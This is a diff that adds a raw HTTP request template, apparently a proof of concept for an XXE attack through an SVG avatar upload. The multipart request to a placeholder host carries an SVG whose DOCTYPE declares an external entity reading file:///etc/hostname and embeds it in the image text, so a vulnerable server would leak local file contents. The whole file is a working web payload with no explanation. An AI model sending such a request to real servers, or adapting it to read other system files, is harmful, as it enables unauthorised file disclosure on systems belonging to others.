@@ -1,0 +1,16 @@
+POST /upload/avatar HTTP/1.1
+Host: TARGET_HOST
+Content-Type: multipart/form-data; boundary=----XXEBoundary
+Cookie: session=SESSION_COOKIE
+Content-Length: CONTENT_LENGTH
+
+------XXEBoundary
+Content-Disposition: form-data; name="avatar"; filename="avatar.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+  <text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+------XXEBoundary--
